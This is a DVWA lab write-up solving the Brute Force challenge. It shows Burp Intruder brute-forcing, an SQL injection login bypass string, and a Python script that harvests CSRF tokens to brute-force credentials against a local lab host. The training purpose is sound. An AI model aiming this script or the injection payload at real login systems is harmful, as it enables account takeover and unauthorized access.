# DVWA - Brute Force Solution

## Low level

### Solution

Use the proxy to interrupt the package.

![](https://i.imgur.com/TPzebgj.png)

Then send the package to the intruder. After that we can set the parameter. We need to set the account and the password to attack. And set the adttack type to cluster bomb. Than we need to set the payload. Add some easily to attack account and password to the set. After that we can start to attack.

![](https://i.imgur.com/xA5lypI.png)

When finish attack we can to observe the length. We can see there has a different length. Then we can manual to use the account and password to try to login.

![](https://i.imgur.com/7FZbHzS.png)

We can use the admin/password to login.

![](https://i.imgur.com/46S4ouw.png)

### Solution

If we know the account. But we don't have the password. We can use the sql injection to pass.
In this case, we can use the account: admin' or '1' = '1 and password: to paas.

![](https://i.imgur.com/XPaA4GI.png)

## Medium level

Because the source adds the `mysql_real_escape_string` so it can recognize the special sign.
In this case, we only can use the Burpsuite to do Brute Force.

## High level

### Solution 1

In this case, the page add the token to verify. So, we can use the brupsuite to Brute Force the account and password.
First also use proxy to interrupt the package, and send it to intruder.
And set the passwoed and user_token to the parameter.

![](https://i.imgur.com/Dzw6QT8.png)

Go intruder -> option -> Grep-Extract, choose the value of user_token.

![](https://i.imgur.com/FiwR6cU.png)

And set the payload of user_token choose the Payload Type to Recursive grep. Remember to copy the initial user_token. After that, you can start to attack.

![](https://i.imgur.com/IrdPL3W.png)

At the end, you can see the result.

![](https://i.imgur.com/VvgVXzA.png)

### Solution 2

Use the code to get the user_token and test the account and password.

```python
import requests
from bs4 import BeautifulSoup

#dict
payloads = [
    'administrator',
    'admin',
    'password',
    'passwd',
    '123456',
    '123'
]

url = """http://192.168.1.66/DVWA-master/vulnerabilities/brute/?username={0}&password={1}&Login=Login&user_token={2}"""

cookies = {
    'security':'high',
    'PHPSESSID':'mfnrbgq0q5qepj43egak4amjjl'
}

headers = {
    'User-Agent':'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0',
}

def attack(payloads,url):
    #get user_token
    source = 'http://192.168.1.66/DVWA-master/vulnerabilities/brute/index.php#'
    web_data = requests.get(source, headers = headers, cookies = cookies)
    soup = BeautifulSoup(web_data.text, 'lxml')
    user_token = soup.select('input[name="user_token"]')[0]['value']

    for payload1 in payloads:
        for payload2 in payloads:
            target = url.format(payload1, payload2, user_token)
            print('target url: ' + target)
            web_data = requests.get(target,headers = headers, cookies = cookies)
            soup = BeautifulSoup(web_data.text,'lxml')
            user_token = soup.select('input[name="user_token"]')[0]['value']
            feature = soup.find('pre')
            try:
                if feature.get_text() == 'Username and/or password incorrect.':
                    print('error')
            except:
                print('result:')
                print('username:' + payload1+'\n' + 'password:' + payload2)
                exit('end')

attack(payloads,url)
```

The result you will get.

```bash=
target url: http://192.168.1.66/DVWA-master/vulnerabilities/brute/?username=admin&password=admin&Login=Login&user_token=bf6a4968f65876096a8217991f9ac414
error
target url: http://192.168.1.66/DVWA-master/vulnerabilities/brute/?username=admin&password=password&Login=Login&user_token=013c6315db7a2ef6eb65ca22abeea491
result:
username:admin
password:password
end

```

## Impossibel level

### Some error

The timezone of MySQL is UTC-6. However, the timezone in PHP is UTC+1. So, we need to edit the sorce code at  35 line to correct the time. Or if we try login over the time we set, the account will not be locked.
As the following code we can see the 35 line I add the 7 hours to correct the time.

```php
  if( ( $data->rowCount() == 1 ) && ( $row[ 'failed_login' ] >= $total_failed_login ) )  {
        // User locked out.  Note, using this method would allow for user enumeration!
        //$html .= "<pre><br />This account has been locked due to too many incorrect logins.</pre>";

        // Calculate when the user would be allowed to login again
        $last_login = strtotime( $row[ 'last_login' ] ) + (7*60*60);
        $timeout    = $last_login + ($lockout_time * 60);
        $timenow    = time();

        /*
        print "The last login was: " . date ("h:i:s", $last_login) . "<br />";
        print "The timenow is: " . date ("h:i:s", $timenow) . "<br />";
        print "The timeout is: " . date ("h:i:s", $timeout) . "<br />";
        */

        // Check to see if enough time has passed, if it hasn't locked the account
        if( $timenow < $timeout ) {
            $account_locked = true;
            // print "The account is locked<br />";
        }
    }
```

### Solution

Because the login will lock the account when we try too many times, maybe we can try to brup force on account.
